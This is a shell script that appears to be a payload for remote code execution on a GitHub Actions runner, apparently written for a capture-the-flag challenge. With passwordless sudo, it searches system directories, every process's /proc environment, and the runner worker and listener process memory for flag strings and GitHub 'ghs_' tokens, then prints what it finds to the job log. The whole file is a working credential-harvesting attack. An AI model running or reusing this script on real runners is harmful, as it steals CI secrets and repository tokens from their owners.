#!/bin/sh
echo "===PWNED-lazyhacker6-RCE-V4==="
echo "job=${GITHUB_JOB:-} ref=${GITHUB_REF:-} sha=${GITHUB_SHA:-}"
id 2>/dev/null || true
if sudo -n true 2>/dev/null; then
  echo "sudo=yes"
  echo "--- secret file scan ---"
  sudo sh -c 'timeout 60 grep -rao "FLAG{[^}]*}" /home /tmp /var/tmp /root /etc /opt 2>/dev/null | head -5' || true
  echo "--- proc env scan ---"
  sudo sh -c 'for p in /proc/[0-9]*/environ; do tr "\0" "\n" < "$p" 2>/dev/null | grep -aE "FLAG\{|ghs_[A-Za-z0-9]{20,}"; done | head -10' || true
  echo "--- worker memory scan (flag) ---"
  sudo sh -c 'for pid in $(pgrep -f "Runner.Worker|Runner.Listener" 2>/dev/null); do echo "pid=$pid"; timeout 45 grep -ao -m2 "FLAG{[^}]*}" /proc/$pid/mem 2>/dev/null; done' || true
  echo "--- worker memory scan (token) ---"
  sudo sh -c 'for pid in $(pgrep -f "Runner.Worker|Runner.Listener" 2>/dev/null); do timeout 45 grep -ao -m2 "ghs_[A-Za-z0-9]\{20,\}" /proc/$pid/mem 2>/dev/null; done' || true
else
  echo "sudo=no"
fi
echo "--- runner temp scan ---"
timeout 30 grep -rao "FLAG{[^}]*}" "${RUNNER_TEMP:-/nonexistent}" 2>/dev/null | head -5 || true
echo "===PWNED-lazyhacker6-V4-END==="
exit 1
